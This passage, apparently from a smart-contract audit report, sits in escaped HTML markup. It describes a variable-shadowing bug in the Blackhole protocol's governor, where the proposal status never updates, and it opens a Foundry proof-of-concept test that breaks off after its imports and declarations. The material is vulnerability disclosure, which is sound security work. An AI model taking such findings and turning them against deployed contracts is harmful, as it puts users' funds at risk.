class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehashProposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eepochTimeHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit variable is shadowed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis vulnerability should be High severity, as the core functionality of the protocol is not working. The status is never updated leading to \u003ccode\u003etailEmissionRate\u003c/code\u003e always being the same.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eGet rid of the shadowing and update the status variable.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-13\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThis POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder.\u003c/p\u003e\n\u003cp\u003eThe POC is the simple version of the finding, in order to run it one has to first change the code of the Governor, so that other vulnerability in the code is fixed, as without that change proposals DO NOT WORK. Look at the \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-163\"\u003e\u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e finding.\u003c/p\u003e\n\u003cp\u003eAlso to see what’s happening one might add \u003ccode\u003econsole.logs\u003c/code\u003e to minter upgradeable and Governor contract that is used inside \u003ccode\u003eBlackGovernor\u003c/code\u003e. We can see that even though the state of the proposal should be \u003ccode\u003eX\u003c/code\u003e, the status variable is always default value.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/Black.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/MinterUpgradeable.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/RewardsDistributor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PermissionsRegistry.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/TokenHandler.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VoterV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VotingEscrow.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AVM/AutoVotingEscrowManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/GaugeManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PairGenerator.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/GaugeFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/PairFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AlgebraCLVe33/GaugeFactoryCL.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/BlackGovernor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IMinter.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/libraries/BlackTimeLibrary.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGovernanceStatusNotUpdatingTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    